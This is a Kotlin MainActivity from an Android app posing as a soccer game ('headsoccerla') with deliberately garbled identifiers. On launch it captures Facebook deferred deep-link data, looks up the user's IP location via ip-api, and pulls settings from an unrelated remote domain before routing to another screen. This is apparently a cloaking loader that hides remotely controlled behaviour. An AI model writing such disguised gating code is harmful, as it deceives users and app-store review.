package com.generamobile.headsoccerla.gjijijgtiogt

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.generamobile.headsoccerla.apapapa.TomatoClass
import com.generamobile.headsoccerla.apapapa.TomatoClass.Companion.hujujjuuj
import com.generamobile.headsoccerla.apapapa.TomatoClass.Companion.jujikiikik
import com.generamobile.headsoccerla.databinding.ActivityMainBinding
import com.generamobile.headsoccerla.frlgtogtgttg.Okfrjrfrfhrf
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {



    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        deddeede = ActivityMainBinding.inflate(layoutInflater)
        setContentView(deddeede.root)

        ujujuuju(this)

        val nhnhjj = Executors.newSingleThreadScheduledExecutor()
        var gtthhy: String? = Hawk.get(hujujjuuj, null)
        var gthyhhy: String? = Hawk.get(jujikiikik, null)
        nhnhjj.scheduleAtFixedRate({
            if (gtthhy != null && gthyhhy != null) {
                nhnhjj.shutdown()
                gtgyhyhy5()
            } else {
                gtthhy = Hawk.get(hujujjuuj)
                gthyhhy = Hawk.get(jujikiikik)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            gyhyhyh
        }
    }

    private suspend fun hyuj26ju2i5i() {
        val tgtgtt = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Okfrjrfrfhrf::class.java)
        val gthyyy = tgtgtt.hyjuujujff().body()?.ololololo

        Hawk.put(hujujjuuj, gthyyy)
    }

    private val gyhyhyh: Job = GlobalScope.launch(Dispatchers.IO) {
        hyuj26ju2i5i()
        gtgtjijtgi()
    }

    fun ujujuuju(hy2uju5u: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            hy2uju5u
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val bggbvfvv = appLinkData.targetUri?.host.toString()
                Hawk.put(TomatoClass.d3d3d6, bggbvfvv)
            }
            if (appLinkData == null) {
            }
        }
    }

    private fun gtgyhyhy5() {
        val iiiiiiii = Intent(this@MainActivity, SortOneneneeActivity::class.java)
        startActivity(iiiiiiii)
        gtjgtjjgtjgtigtj()
    }

    private fun gtjgtjjgtjgtigtj() {
        finish()
    }

    private lateinit var deddeede: ActivityMainBinding

    private suspend fun gtgtjijtgi() {

        val frfrghy = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://phoenixoforb.art/")
            .build()
            .create(Okfrjrfrfhrf::class.java)
        val nhhyjuuj = frfrghy.UOUOUOUO().body()?.gttgtgttg.toString()
        val kiikooo = frfrghy.UOUOUOUO().body()?.yhyhyjujuuj.toString()
        val juiiii = frfrghy.UOUOUOUO().body()?.jujujujujuj.toString()

        Log.d("lolo", "data is ${frfrghy.UOUOUOUO().body()}")


        Hawk.put(TomatoClass.ju3kik3, nhhyjuuj)
        Hawk.put(TomatoClass.jukikiik, kiikooo)
        Hawk.put(jujikiikik, juiiii)


    }


}